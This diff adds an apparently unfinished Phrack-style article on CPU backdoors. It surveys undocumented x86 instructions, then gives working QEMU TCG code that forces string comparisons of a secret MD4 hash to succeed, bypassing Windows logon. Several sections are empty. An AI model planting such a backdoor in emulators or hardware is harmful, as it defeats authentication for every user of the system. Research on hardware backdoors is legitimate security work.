@@ -1,0 +1,424 @@
+set tw=75
+gq: "rewrap the text."
+
+|=-----------------------------------------------------------------------=|
+|=--------------------------=[ A CPU Backdoor  ]=------------------------=|
+|=-----------------------------------------------------------------------=|
+|=------------------=[ uty <whensungoes@gmail.com> ]=--------------------=|
+|=-----------------------------------------------------------------------=|
+
+--[ Table of contents
+
+1. Introduction
+2. Background: Existing "Backdoors"
+    2.1 Hidden Instructions 
+       2.1.1 VIA C3 Nehemiah ALTINST instruction 
+       2.1.2 AMD K7 MSR Secret Code 0x9C5A203A
+    2.2 Network Chips
+3. A New CPU Backdoor
+    3.1 The Idea
+    3.2 Windows on QEMU
+    3.3 On a Real CPU: OpenSPARC T1
+4. Demo
+5. Other Applications
+6. Greetings
+7. References
+8. Appendix: Code
+
+
+--[ 1. Introduction
+
+
+--[ 2. Background: Existing "Backdoors"
+
+--[ 2.1 Hidden Instructions
+
+Hidden instructions will be the first thing to be thought of. There could
+be one instruction that once you execute it, you suddenly become root.
+Indeed, there are undocumented instructions[5][6][7][8]. Examing the opcode
+space from the manual, we know that there must be many opcodes that are not
+documented or not used yet. It is not difficult to find new instructions in
+the more recent manual compared with the old ones.  All instructions need
+to comply with the rules of opcode expansion.  However, defining the extra
+extension byte for the new instruction series is up to the vendor. Besides,
+how to trigger the hidden functionality of an existing instruction is also
+undermined. For example, it may need to load a specific value within a
+particular register to start the backdoor. Such instances exist.
+
+--[ 2.1.1 VIA C3 Nehemiah ALTINST instruction 
+
+ALTINST stands for alternation instruction, and it is documented in the
+manual[9] for tests and particular uses. The alternate
+instruction set has additional registers and different instruction forms of
+the x86 instruction architecture. It can run privileged instruction from
+any protection level,  bypass memory descriptor checks, and many x86
+exceptions such as alignment checks. These instructions are undocumented,
+and they are considered RISC-microcode that runs internally in the CPU.
+
+To run these instructions, it needs a unique mechanism. First, set the FCR
+(FEATURE CONTROL REGISTER) ALTINST bit to one using WRMSR, a privileged
+instruction that writes MSR (Model Specific  Register). The use of a
+privileged operation represents that the ALTINST is designed as a debugging
+function. After that, a new two-byte jump instruction 0x0F3F is enabled. In
+the x86 architecture opcode map, 0x0F is an escape byte that leads to the
+following byte parsed as part of the opcode, and 0x0F38 and 0x0F3A are also
+the escape bytes. However, 0x0F3F is an invalid instruction, as shown
+in~\autoref{tab:opcode-map}.
+
++---------------------------------------------         -------------------+
+|  |pfx|    8   |   9   |     A    |   B    |          |   E    |     F   |
+|--+---+--------+-------+----------+--------+-         +--------+---------|
+| 0|   |INVD    |WBINVD |          |2-byte  |          |        |         |
+|  |   |        |       |          |illegal |    ...   |        |         |
+|  |   |        |       |          |opcodes |          |        |         |
+|  |   |        |       |          |  UD2   |          |        |         |
+|--+---+--------+-------+----------+----------         +--------+---------|
+| 1|   |Prefetch|                                               |NOP /0 Ev|
+|  |   |(Grp 16)|                                               |         |
+|--+---+--------+-------+----------+----------         +--------+---------|
+|  |   |vmovaps |vmovaps| cvtpi2ps |vmovntps|          |vucomiss| vcomiss |
+|  |   |Vps,Wps |Wps,Vps| Vps,Qpi  |Mps,Vps |          |Vss,Wss | Vss,Wss |
+|  |---+--------+-------+----------+--------+-   ...   +--------+---------|
+|  | 66|vmovapd |vmovapd| cvtpi2pd |vmovntpd|          |vucomisd| vcomisd |
+|  |   |Vpd,Wpd |Wpd,Vpd| Vpd,Qpi  |Mpd,Vpd |          |Vsd,Wsd | Vsd,Wsd |
+| 2|---+--------+-------+----------+--------+-         +--------+---------|
+|  | F3|        |       |vcvtsi2ss |        |          |        |         |
+|  |   |        |       |Vss,Hss,Ey|        |          |        |         |
+|  |---+--------+-------+----------+--------+-         +--------+---------|
+|  | F2|        |       |vcvtsi2sd |        |          |        |         |
+|  |   |        |       |Vsd,Hsd,Ey|        |    ...   |        |         |
+|--+---+--------+-------+----------+--------+-         +--------+---------|
+| 3|   | 3-byte |       |  3-byte  |        |          |        |         |
+|  |   | escape |       |  escape  |        |          |        |         |
+|--+---+--------+-------+----------+--------+-         +--------+---------|
+|       ...                                                               |
+
+
+The 0x0F3F jump instruction has no operand. If FCR.ALTINST is zero, the
+execution of 0x0F3F causes an invalid instruction exception. Otherwise, it
+directly causes a near branch to CS: EAX. In addition to the branch, the
+0x0F3F instruction sets the processor into an internal model where the
+target bytes are not interpreted as x86 instructions but as unknown
+instruction set instructions.
+
+Moreover, the alternate instructions also use a particular format instead
+of plain binary. They are in units of 32 bits, and each instruction is
+prefixed with 0x8D8400. The alternate instructions are presented as the
+32-bit displacement of an LEA instruction, LEA [EAX+EAX+disp]. When
+executing, the 0x8D8400 prefix is stripped off, and the 32-bit alternate
+instruction in the displacement field will be executed. The alternate
+instruction set also has a branch instruction that returns control to x86
+normal mode. Regarding the instruction format, the processor manual does
+not provide more details.
+
+However, research work[10] and the VIA processor microarchitecture-related
+patents[11][12][13][14] show that the alternate instruction set is likely
+to be ARM. Verifying the alternate instructions is out of the scope of this
+paper.
+
+
+--[ 2.1.2 AMD K7 MSR Secret Code 0x9C5A203A
+
+0x9C5A203A is a famous password that enables the hidden debugging function
+of AMD K7 processors. Internet user Czernobyl reveals that undocumented
+MSRs are used for debugging purposes[15]. For instance, MSR
+0xC0010115 is used to access physical memory. Put the physical address into
+the EBX register and the 64-bit value into EDX, EAX registers, and then use
+RDMSR or WRMSR to read/write the physical memory. In particular, this
+function is undocumented but does not require a password. But for many
+other MSRs, it needs to put the password 0x9C5A203A in the EDI to enable
+the debugging capability[16].
+
+As learned from this example, we know that the MSR can provide various
+capacities, and it is practical to use a unique value in a register to
+trigger the hidden function.
+
+
+--[ 2.2 Network Chips
+
+Other than those mentioned above, I believe that malicious ethernet and
+Wi-Fi chips connect to the motherboard as peripheral devices. Those chips
+may monitor the network traffic and look for patterns in the data package.
+Once triggered, they can crash the system easily or overwrite the main
+memory to control the system.
+
+
+--[ 3. A New CPU Backdoor
+
+The hidden instructions are more like a local exploit, namely privilege
+escalation. In many scenarios, bypassing the authentication mechanism to
+access the system is still a problem. The most common case is you sit in
+front of a terminal, and the system asks you for your user name and
+password, like in the movie scene Swordfish. You already have a software
+backdoor installed or a hardware backdoor designed in the machine.
+
+--[ 3.1 The Idea
+
+
+Now what I am trying to do here is to explain how to implement a stealthy
+password backdoor in the CPU.
+
+How the password usually works? A user inputs the user name and the
+corresponding password. The operating system first pads the password string
+and either encrypt or hashes it to get a hash string. Then the system will
+compare the hash string with the valid one stored in the system. If they
+are equal, authentication is successful. 
+
+The whole process is like when some software asks for a license. Many of
+you crackers know there will be a "crucial jump" that can make the wrong
+thing right if you mess with it. Many previous works bypass the Windows
+authentication by patching the crucial jump through, for example, firewire
+or PCI bus.
+
+There is an msv1_0.dll in the logon.exe process responsible for the user
+password verification in the Windows operating system.
+MsvpPasswordValidate() calls RtlCompareMemory() to compare two MD4 hashes.
+One is generated from the user inputs password, and the other is retrieved
+from the Windows SAM (Security Account Manager) database. From the software
+point of view, hooking MsvpPasswordValidate() will be the best choice.
+Valid your backdoor password hash there and return an appropriate value,
+0x1 in this case, indicating the input MD4 hash is correct.
+
+ntdll!RtlCompareMemory:
+76ff6970 56 push esi
+76ff6971 57 push edi
+76ff6972 fc cld
+76ff6973 8b74240c mov esi,dword ptr [esp+0Ch]
+76ff6977 8b7c2410 mov edi,dword ptr [esp+10h]
+76ff697b 8b4c2414 mov ecx,dword ptr [esp+14h]
+76ff697f c1e902 shr ecx,2
+76ff6982 7404 je ntdll!RtlCompareMemory+0x18 (76ff6988)
+
+ntdll!RtlCompareMemory+0x14:
+76ff6984 f3a7 repe cmps dword ptr [esi],dword ptr es:[edi]
+76ff6986 7516 jne ntdll!RtlCompareMemory+0x2e (76ff699e)
+
+ntdll!RtlCompareMemory+0x18:
+76ff6988 8b4c2414 mov ecx,dword ptr [esp+14h]
+76ff698c 83e103 and ecx,3
+76ff698f 7404 je ntdll!RtlCompareMemory+0x25 (76ff6995)
+
+ntdll!RtlCompareMemory+0x21:
+76ff6991 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
+76ff6993 7516 jne ntdll!RtlCompareMemory+0x3b (76ff69ab)
+
+ntdll!RtlCompareMemory+0x25:
+76ff6995 8b442414 mov eax,dword ptr [esp+14h]
+76ff6999 5f pop edi
+76ff699a 5e pop esi
+76ff699b c20c00 ret 0Ch
+
+ntdll!RtlCompareMemory+0x2e:
+76ff699e 83ee04 sub esi,4
+76ff69a1 83ef04 sub edi,4
+76ff69a4 b904000000 mov ecx,4
+76ff69a9 f3a6 repe cmps byte ptr [esi],byte ptr es:[edi]
+
+ntdll!RtlCompareMemory+0x3b:
+76ff69ab 4e dec esi
+76ff69ac 2b74240c sub esi,dword ptr [esp+0Ch]
+76ff69b0 8bc6 mov eax,esi
+76ff69b2 5f pop edi
+76ff69b3 5e 
+
+Since the MD4 hash is represented as 16 bytes in memory, which is 32bit
+aligned in a 32-bit system, the instruction "cmps" (compare strings) makes
+the comparison. 
+
+"f3a7   repe cmps dword ptr [esi],dword ptr es:[edi]"
+
+The two memory buffer addresses are stored in the esi and edi register.
+Moreover, the register ecx stores the count of the 32-bit comparison that
+should make. "repe" or "repz" is a prefix, so the cmps loops until the ecx
+decrease to zero. After every iteration, the edi and esi increase by four,
+and the ecx decreases by one.
+
+Whenever the CPU processes a cmps instruction, it sets the Z flag if the
+edi register value is recognized. Z indicates two operand equals. For
+example, 97e6bd3d a79016d7 eb4b2069 78362812 is the 16-byte for password
+"123". If the CPU knows the four 32-bit values, we can have a secret
+password that passes the Windows logon authentication with any valid user
+name.
+
+Yes, this CPU backdoor still needs cooperation with the software stack. But
+how often have those libraries changed in decades? We do not even know it
+is because of unnecessary or for a purpose.
+
+
+--[ 3.2 Windows on QEMU
+
+Unfortunately, I can not find an open-source X86 CPU, nor can I make one
+myself. To demonstrate how the backdoor works for the Windows system, I use
+QEMU TCG to emulate it.
+
+TCG(Tiny Code Generator) is the dynamic binary translation engine for QEMU.
+It transforms target instructions via the TCG front-end to TCG ops (in the
+form of c code) which are then compiled into host instructions. This
+technique is called Dynamic Binary Translation. Although it is also pure
+software emulation, it is much faster than the emulator that emulates
+instructions one by one, such as Bochs.
+
+There is not much documentation for the TCG, and it is pretty challenging
+to get familiar with. For this project, the starting point could be the
+following function.
+
+static target_ulong disas_insn (DisasContext *s, CPUState *cpu);
+
+It is located at "target/i386/tcg/translate.c". Both x86 and x86_64 share
+the same file, only with minor changes on the operands. disas_insn() has a
+gigantic switch-case that decodes each instruction. 0xa7 is the opcode for
+cmps with dword operands, and you can locate the following code. 
+
+    case 0xa6: /* cmpsS */
+    case 0xa7:
+        ot = mo_b_d(b, dflag);
+        if (prefixes & PREFIX_REPNZ) {
+            gen_repz_cmps(s, ot, pc_start - s->cs_base, s->pc - s->cs_base, 1);
+        } else if (prefixes & PREFIX_REPZ) {
+            gen_repz_cmps(s, ot, pc_start - s->cs_base, s->pc - s->cs_base, 0);
+        } else {
+            gen_cmps(s, ot);
+        }
+        break;
+
+gen_cmps() handles individual cmps instruction, and gen_repz_cmps() is a
+micro that takes repeated cmps which eventually calls gen_cmps() too. 
+
+static inline void gen_cmps(DisasContext *s, MemOp ot)
+{
+    gen_string_movl_A0_EDI(s);
+    gen_op_ld_v(s, ot, s->T1, s->A0);
+    gen_string_movl_A0_ESI(s);
+    gen_op(s, OP_CMPL, ot, OR_TMP0);
+    gen_op_movl_T0_Dshift(s, ot);
+    gen_op_add_reg_T0(s, s->aflag, R_ESI);
+    gen_op_add_reg_T0(s, s->aflag, R_EDI);
+}
+
+The gen_cmps() are composed of co-called TCG front-end ops[25]. 
+They are C functions prefixed with tcg_, for example, tcg_gen_mov_tl(). You
+can think of it as programming using the TCG assembly. To make it
+convenient for complex operations, TCG also provides a mechanism called
+helper_functions.
+
+static inline void gen_cmps(DisasContext *s, MemOp ot)
+{
+    TCGv ret0;
+    ret0 = tcg_temp_local_new();
+
+    gen_string_movl_A0_EDI(s);
+    gen_op_ld_v(s, ot, s->T1, s->A0);
+    gen_string_movl_A0_ESI(s);
+
+    gen_helper_malicious_cmps(ret0, cpu_env, s->T1);
+    gen_malicious_op(s, OP_CMPL, ot, OR_TMP0, ret0);
+
+    gen_op_movl_T0_Dshift(s, ot);
+    gen_op_add_reg_T0(s, s->aflag, R_ESI);
+    gen_op_add_reg_T0(s, s->aflag, R_EDI);
+
+    tcg_temp_free(ret0);
+}
+
+Here is the code added, and gen_helper_malicious_cmps() is the helper
+function where I check if the operand is one of my secret values.
+
+#ifdef TARGET_X86_64
+target_ulong helper_malicious_cmps(CPUX86State *env, uint64_t rdi)
+{
+    target_ulong val = 0;
+    
+    if (rdi == 0xa79016d797e6bd3d || rdi == 0x78362812eb4b2069)
+    {
+        printf("helper_malicious_cmps: edi 0x%llx\n", (long long unsigned int)rdi);
+        val = 1;
+    }
+    
+    return val;
+}
+#else
+target_ulong helper_malicious_cmps(CPUX86State *env, uint32_t edi)
+{
+    target_ulong val = 0;
+
+    if (edi == 0x97e6bd3d || edi == 0xa79016d7 || edi == 0xeb4b2069 || edi == 0x78362812)
+    {
+        printf("helper_malicious_cmps: edi 0x%x\n", edi);
+        val = 1;
+    }
+
+    return val;
+}
+#endif
+
+You can see that inside the helper function, it is a whole other world,
+where you can call printf() to let QEMU sends out debug information to the
+console. Here I check whether the cmps instruction is comparing my secret
+password. The MD4 hash I am looking for is "97e6bd3d a79016d7 eb4b2069
+78362812", which is for password "123". If the CPU sees any edi or rdi
+values that are part of the secret hash, it will set the Z flag for the
+current cmps instruction, which means the two operands are equal (which is
+not).
+
+In this way, you can log in as an existing user with the secret password
+123 on any Windows system installed on this malicious QEMU. The Windows
+operating system is intact and has not been modified. I only tried 32-bit
+Windows XP and 64-bit Windows 10, but I believe the authentication
+mechanism hasn't changed much for a long time.
+
+In reality, all I have to do is insert malicious RTL code into the CPU's
+ALU module. The following section will cover this part.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+--[ 7. References
+
+[5] A Performance Evaluation of Platform-Independent Methods to Search for
+    Hidden Instructions on RISC Processors.  
+[6] Breaking the x86 ISA. BlackHat, USA, 2017.
+[7] Uisfuzz: An efficient fuzzing method for CPU undocumented instruction
+    searching. 
+[8] Uncovering Hidden Instructions in Armv8-A Implementations. 
+[9] VIA C3 Nehemiah Datasheet, 2004.
+[10] Hardware backdoors in x86 CPUs. Black Hat, 2018.
+[11] Apparatus and method for limiting access to model specific registers
+     in a microprocessor, December 25 2012. US Patent 8,341,419.
+[12] Microprocessor that performs X86 ISA and arm ISA machine language
+     program instructions by hardware translation into microinstructions
+     executed by common execution pipeline, November 4 2014. US Patent
+     8,880,851.
+[13] Microprocessor with boot indicator that indicates a boot ISA of the
+     microprocessor as either the X86 ISA or the ARM ISA, April 19 2016. 
+     US Patent 9,317,301.
+[14] Microprocessor that enables ARM ISA program to access 64-bit general
+     purpose registers written by x86 ISA program, March 22 2016. US 
+     Patent 9,292,470.
+[15] 'Super-secret' debugger discovered in AMD CPUs
+     https://www.theregister.com/2010/11/15/amd_secret_debugger/
+[16] AMD Undocumented Machine-Specific Registers
+     http://cbid.softnology.biz/html/undocmsrs.html
+[25] https://wiki.qemu.org/Documentation/TCG/frontend-ops
+
